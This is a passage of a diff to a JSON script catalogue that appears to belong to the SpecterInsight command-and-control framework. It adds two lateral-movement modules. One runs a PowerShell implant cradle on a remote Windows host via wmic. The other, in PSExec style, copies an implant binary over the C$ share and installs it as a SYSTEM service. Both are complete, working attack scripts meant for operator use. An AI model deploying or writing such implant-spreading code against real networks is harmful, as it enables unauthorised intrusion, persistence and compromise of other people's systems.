+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\n#Generate a new PowerShell cradle command\r\n$Command = payload -Build $Build -Kind 'ps_command';\r\n\r\n#Shell escape any embedded slashes\r\n$Command = $Command.Replace('\\', '\\\\');\r\n$Command = $Command.Replace('\"', '\\\"');\r\n\r\n#Execute command on remote system using WMI commandline executable\r\nif(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {\r\n    #Run with explicit credentials\r\n    wmic.exe /node:$Target /user:$Username /password:$Password process call create $Command;\r\n} else {\r\n    #Run with impersonation\r\n    wmic.exe /node:$Target process call create $Command;\r\n}",
+    "version": 5,
+    "isPremium": true,
+    "labels": [
+      "command-and-scripting-interpreter",
+      "command-line",
+      "execution",
+      "lateral-movement",
+      "powershell",
+      "windows",
+      "windows-command-shell",
+      "windows-management-instrumentation"
     ],
     "enabled": true
   },
@@ -1114,6 +1197,26 @@
       "api",
       "discovery",
       "host-discovery"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "b0e972a962fb42aaa2f9e0c32a240bf7",
+    "name": "Lateral Movement Using Service Control Manager and Custom Binary (PSExec)",
+    "description": "This script loads a SpecterInsight implant onto the remote system by installing a custom service binary that reflectively loads a Specter.",
+    "documentation": "# Overview\r\n\r\nThis script leverages the Service Control Manager API to create and execute a remote service on the operator specified system using username and password. The custom service binary is run under the NT AUTHORITY\\SYSTEM account. The $Hostname parameter can be either hostname, FQDN, or IP.\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Dependencies\r\n\r\n- common\r\n- lateral\r\n\r\n# Pre-Requisites\r\n\r\n- Valid credentials for the target systems.\r\n- Service Control Manager\r\n- Firewall permissions to establish RPC connections\r\n- Server Service\r\n- Administrative Shares enabled\r\n- Firewall permissions allowing SMB connections",
+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The folder where the service directory will be created.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The folder where the service directory will be created.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$Directory = \"C:\\Program Files\\\",\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The type of payload to drop.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The type of payload to drop.\")]\r\n    [ValidateSet(\"csharp_service_load_module\", \"csharp_service_powershell_host\")]\r\n    [string]$Payload = \"csharp_service_load_module\"\r\n)\r\n\r\nload common;\r\nload lateral;\r\n\r\n#Generate a new PowerShell cradle command\r\n$contents = payload -Build $Build -Kind $Payload;\r\n$config = payload -Build $Build -Kind 'csharp_config';\r\n\r\n#Get the filename of the payload\r\n$assembly = [System.Reflection.Assembly]::Load($contents);\r\n$filename = $assembly.GetName();\r\n$serviceName = $filename.Name + \"Svc\";\r\n\r\n#Define the remote paths\r\n$sharePath = \"\\\\$Target\\C`$\";\r\n$uncRootPath = [System.IO.Path]::Combine([System.IO.Path]::Combine($sharePath, $Directory.Replace(\"C:\\\", \"\")), $filename.Name);\r\n$uncBinaryPath = [System.IO.Path]::Combine($uncRootPath, $filename.Name + \".exe\");\r\n$localRootPath = [System.IO.Path]::Combine($Directory, $filename.Name);\r\n$localBinaryPath = [System.IO.Path]::Combine($localRootPath, $filename.Name + \".exe\");\r\n\r\n#Copy the payload to the remote system\r\ntry {\r\n    if([string]::IsNullOrEmpty($Username)) {\r\n        [void][System.IO.Directory]::CreateDirectory($uncRootPath);\r\n        [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);\r\n        [System.IO.File]::WriteAllText($uncBinaryPath + \".config\", $config);\r\n\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath;\r\n    } else {\r\n        $credentials = New-Object System.Net.NetworkCredential($Username, $Password);\r\n        $share = [common.IO.TemporaryNetworkShare]::Map($sharePath, $credentials);\r\n        try {\r\n            [void][System.IO.Directory]::CreateDirectory($uncRootPath);\r\n            [System.IO.File]::WriteAllBytes($uncBinaryPath, $contents);\r\n            [System.IO.File]::WriteAllText($uncBinaryPath + \".config\", $config);\r\n        } finally {\r\n            $share.Dispose();\r\n        }\r\n\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $serviceName -Path $localBinaryPath -Username $Username -Password $Password;\r\n    }\r\n    $success = $true;\r\n} catch {\r\n    $success = $false;\r\n    throw;\r\n}\r\n\r\nNew-Object psobject -Property @{\r\n    Lateral = New-Object psobject -Property @{\r\n        Method = \"System Sevice\";\r\n        Path = $localBinaryPath;\r\n        ServiceName = $serviceName;\r\n        Payload = $Payload;\r\n        System = $Target;\r\n        Username = $Username;\r\n        Success = $success;\r\n    };\r\n};",
+    "version": 19,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "create-or-modify-system-process",
+      "lateral-movement",
+      "service-execution",
+      "system-services",
+      "valid-accounts",
+      "windows",
+      "windows-service"
     ],
     "enabled": true
   },
